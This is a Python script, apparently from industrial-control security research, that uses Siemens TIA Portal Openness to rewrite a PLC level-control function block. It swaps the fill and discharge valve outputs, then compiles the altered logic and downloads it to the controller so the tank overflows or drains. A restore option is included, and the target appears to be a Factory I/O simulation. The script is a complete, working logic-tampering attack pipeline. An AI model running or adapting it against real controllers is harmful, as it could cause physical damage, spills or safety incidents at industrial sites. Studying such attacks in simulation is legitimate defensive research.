"""
Tier 3 Experiment: Level Control — Comparison Inversion Attack

Applies a surgical modification to FB_LevelControl via TIA Openness:
  - Swaps FillValve/DischargeValve assignments in the PID control section
  - When level is below setpoint, tank DRAINS instead of filling
  - When level is above setpoint, tank FILLS instead of draining
  - Result: tank overflows or fully empties (depending on initial state)

Pipeline: Read SCL → Modify → Import → Compile → Download to PLC

Safety:
  - Original block XML backed up before any changes
  - Restore function provided to revert to original code
  - All steps logged with timestamps
"""
import clr
import os
import sys
import json
import shutil
import time
from pathlib import Path
from datetime import datetime

# ── Assembly loading (Contract FIRST) ───────────────────────────────
CONTRACT_DLL = r"C:\Program Files\Siemens\Automation\Portal V17\Bin\PublicAPI\Siemens.Engineering.Contract.dll"
ENGINEERING_DLL = r"C:\Program Files\Siemens\Automation\Portal V17\PublicAPI\V17\Siemens.Engineering.dll"

clr.AddReference(CONTRACT_DLL)
clr.AddReference(ENGINEERING_DLL)

from Siemens.Engineering import TiaPortal, ExportOptions
from Siemens.Engineering.HW.Features import SoftwareContainer
from Siemens.Engineering.Compiler import ICompilable, CompilerResult
from Siemens.Engineering.Download import DownloadProvider
from Siemens.Engineering.SW.ExternalSources import GenerateBlockOption
from System.IO import FileInfo

# ── Paths ───────────────────────────────────────────────────────────
PROJECT_ROOT = Path(__file__).resolve().parent.parent
ORIGINAL_SCL = PROJECT_ROOT / "factoryio_scenes" / "FB_LevelControl.scl"
OUTPUT_DIR = PROJECT_ROOT / "data" / "processed" / "tia_openness" / "tier3_experiments"
BACKUP_DIR = OUTPUT_DIR / "backups"
MODIFIED_SCL_DIR = OUTPUT_DIR / "modified_scl"
LOG_FILE = OUTPUT_DIR / "level_control_experiment.jsonl"

# ── The surgical modification ───────────────────────────────────────
# Original: error > 0 → FillValve=output, DischargeValve=0 (fill when below SP)
#           error <= 0 → FillValve=0, DischargeValve=output (drain when above SP)
# Attack:   SWAP the valve assignments → control acts in reverse

ORIGINAL_CONTROL = """\
        IF error > 0.0 THEN
            // Level below setpoint \u2192 fill
            output := error * 1.0;          // P gain = 1.0 (0-10V range)
            IF output > 10.0 THEN output := 10.0; END_IF;
            IF output < 0.0 THEN output := 0.0; END_IF;
            FillValve := output;
            DischargeValve := 0.0;
        ELSE
            // Level at or above setpoint \u2192 stop filling, discharge excess
            FillValve := 0.0;
            output := -error * 1.0;
            IF output > 10.0 THEN output := 10.0; END_IF;
            IF output < 0.0 THEN output := 0.0; END_IF;
            DischargeValve := output;
        END_IF;"""

MODIFIED_CONTROL = """\
        IF error > 0.0 THEN
            // Level below setpoint \u2192 fill
            output := error * 1.0;          // P gain = 1.0 (0-10V range)
            IF output > 10.0 THEN output := 10.0; END_IF;
            IF output < 0.0 THEN output := 0.0; END_IF;
            FillValve := 0.0;
            DischargeValve := output;
        ELSE
            // Level at or above setpoint \u2192 stop filling, discharge excess
            output := -error * 1.0;
            IF output > 10.0 THEN output := 10.0; END_IF;
            IF output < 0.0 THEN output := 0.0; END_IF;
            FillValve := output;
            DischargeValve := 0.0;
        END_IF;"""


def log_event(event_type, details=None):
    """Append a timestamped event to the JSONL log."""
    entry = {
        "timestamp": datetime.now().isoformat(),
        "event": event_type,
    }
    if details:
        entry.update(details)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")
    print(f"  [{event_type}] {details or ''}")


def connect_tia():
    """Attach to running TIA Portal and return (tia, project, plc_sw, plc_item)."""
    processes = TiaPortal.GetProcesses()
    if processes.Count == 0:
        print("ERROR: No running TIA Portal found.")
        sys.exit(1)

    tia = processes[0].Attach()
    project = tia.Projects[0]

    for dev in project.Devices:
        for item in dev.DeviceItems:
            sc = item.GetService[SoftwareContainer]()
            if sc and sc.Software:
                return tia, project, sc.Software, item, dev

    print("ERROR: No PlcSoftware found.")
    sys.exit(1)


def backup_original(plc_sw):
    """Export the original FB_LevelControl as XML backup."""
    BACKUP_DIR.mkdir(parents=True, exist_ok=True)
    backup_path = str(BACKUP_DIR.resolve() / "FB_LevelControl_original.xml")
    if os.path.exists(backup_path):
        os.remove(backup_path)

    for b in plc_sw.BlockGroup.Blocks:
        if str(b.Name) == "FB_LevelControl":
            b.Export(FileInfo(backup_path), ExportOptions.WithDefaults)
            size = os.path.getsize(backup_path)
            log_event("backup", {"path": backup_path, "size": size})
            return backup_path

    print("ERROR: FB_LevelControl not found in PLC blocks.")
    sys.exit(1)


def create_modified_scl():
    """Read original SCL, apply comparison inversion, write modified file."""
    MODIFIED_SCL_DIR.mkdir(parents=True, exist_ok=True)

    original = ORIGINAL_SCL.read_text(encoding="utf-8")

    if ORIGINAL_CONTROL not in original:
        print("ERROR: Could not find the target control section in original SCL.")
        print("This means the SCL structure has changed. Manual inspection needed.")
        sys.exit(1)

    modified = original.replace(ORIGINAL_CONTROL, MODIFIED_CONTROL)

    modified_path = MODIFIED_SCL_DIR / "FB_LevelControl.scl"
    modified_path.write_text(modified, encoding="utf-8")

    log_event("modified_scl_created", {
        "path": str(modified_path),
        "modification": "comparison_inversion",
        "description": "Swapped FillValve/DischargeValve assignments — control acts in reverse",
    })
    return str(modified_path.resolve())


def import_and_generate(plc_sw, modified_scl_path):
    """Import modified SCL as external source and generate blocks."""
    esg = plc_sw.ExternalSourceGroup
    es_coll = esg.ExternalSources

    # Delete existing FB_LevelControl external source if present
    existing = es_coll.Find("FB_LevelControl.scl")
    if existing:
        existing.Delete()
        log_event("deleted_existing_source", {"name": "FB_LevelControl.scl"})

    # Import modified SCL
    new_source = es_coll.CreateFromFile("FB_LevelControl.scl", modified_scl_path)
    log_event("imported_modified_scl", {"name": str(new_source.Name), "path": modified_scl_path})

    # Generate blocks from the imported source (overwrites existing FB)
    none_opt = getattr(GenerateBlockOption, 'None')
    try:
        result = new_source.GenerateBlocksFromSource(none_opt)
        log_event("generate_blocks", {"result": str(result), "status": "success"})
    except Exception as e:
        log_event("generate_blocks", {"error": str(e), "status": "failed"})
        raise


def compile_plc(plc_sw, device):
    """Compile the PLC software."""
    compilable = plc_sw.GetService[ICompilable]()
    if not compilable:
        print("ERROR: ICompilable not available.")
        sys.exit(1)

    log_event("compile_start")
    result = compilable.Compile()

    # Check result
    state = str(result.State)
    warning_count = result.Messages.Count
    errors = []
    warnings = []
    for msg in result.Messages:
        msg_str = str(msg)
        if "error" in msg_str.lower():
            errors.append(msg_str)
        else:
            warnings.append(msg_str)

    log_event("compile_result", {
        "state": state,
        "total_messages": warning_count,
        "errors": len(errors),
        "warnings": len(warnings),
    })

    if errors:
        print(f"  COMPILE ERRORS ({len(errors)}):")
        for e in errors[:5]:
            print(f"    {e}")

    return result


def download_to_plc(plc_item):
    """Download compiled program to PLC."""
    dp = plc_item.GetService[DownloadProvider]()
    if not dp:
        print("ERROR: DownloadProvider not available.")
        sys.exit(1)

    log_event("download_start")

    # Get download configuration
    config = dp.Configuration
    log_event("download_config", {"type": str(type(config).__name__)})

    try:
        result = dp.Download(config, None, None)
        state = str(result.State)
        log_event("download_result", {"state": state})
        return result
    except Exception as e:
        log_event("download_error", {"error": str(e)})
        raise


def restore_original(plc_sw, device, plc_item):
    """Restore original FB_LevelControl from the original SCL in factoryio_scenes/."""
    print("\n=== RESTORING ORIGINAL CODE ===")
    esg = plc_sw.ExternalSourceGroup
    es_coll = esg.ExternalSources

    # Delete modified source
    existing = es_coll.Find("FB_LevelControl.scl")
    if existing:
        existing.Delete()

    # Import original SCL
    original_path = str(ORIGINAL_SCL.resolve())
    new_source = es_coll.CreateFromFile("FB_LevelControl.scl", original_path)

    none_opt = getattr(GenerateBlockOption, 'None')
    new_source.GenerateBlocksFromSource(none_opt)

    # Compile
    compilable = plc_sw.GetService[ICompilable]()
    result = compilable.Compile()
    print(f"  Compile: {result.State}")

    # Download
    dp = plc_item.GetService[DownloadProvider]()
    config = dp.Configuration
    result = dp.Download(config, None, None)
    print(f"  Download: {result.State}")

    log_event("restored_original")
    print("=== ORIGINAL RESTORED ===\n")


def main():
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    print("=" * 60)
    print("Tier 3 Experiment: Level Control — Comparison Inversion")
    print("=" * 60)
    log_event("experiment_start", {"scene": "level_control", "modification": "comparison_inversion"})

    # 1. Connect
    print("\n[1/6] Connecting to TIA Portal...")
    tia, project, plc_sw, plc_item, device = connect_tia()
    log_event("connected", {"project": str(project.Name)})

    # 2. Backup
    print("\n[2/6] Backing up original FB_LevelControl...")
    backup_path = backup_original(plc_sw)

    # 3. Create modified SCL
    print("\n[3/6] Creating modified SCL (comparison inversion)...")
    modified_path = create_modified_scl()

    # 4. Import + generate blocks
    print("\n[4/6] Importing modified SCL → generating blocks...")
    import_and_generate(plc_sw, modified_path)

    # 5. Compile
    print("\n[5/6] Compiling PLC software...")
    compile_result = compile_plc(plc_sw, device)

    # 6. Download
    print("\n[6/6] Downloading to PLC...")
    try:
        download_result = download_to_plc(plc_item)
    except Exception as e:
        print(f"  Download failed: {e}")
        print("  You may need to confirm in TIA Portal UI.")
        log_event("download_needs_ui_confirmation")

    log_event("experiment_deployed", {
        "modification": "comparison_inversion",
        "expected_effect": "Tank drains when level is below setpoint, fills when above — control acts in REVERSE",
    })

    print("\n" + "=" * 60)
    print("DEPLOYED: Comparison inversion active on FB_LevelControl")
    print("Expected: Tank will drain/overflow instead of regulating")
    print()
    print("Watch Factory I/O for the effect.")
    print("To restore: py -3 scripts/tier3_level_control_experiment.py --restore")
    print("=" * 60)


if __name__ == "__main__":
    if "--restore" in sys.argv:
        print("Restoring original Level Control code...")
        tia, project, plc_sw, plc_item, device = connect_tia()
        restore_original(plc_sw, device, plc_item)
    else:
        main()
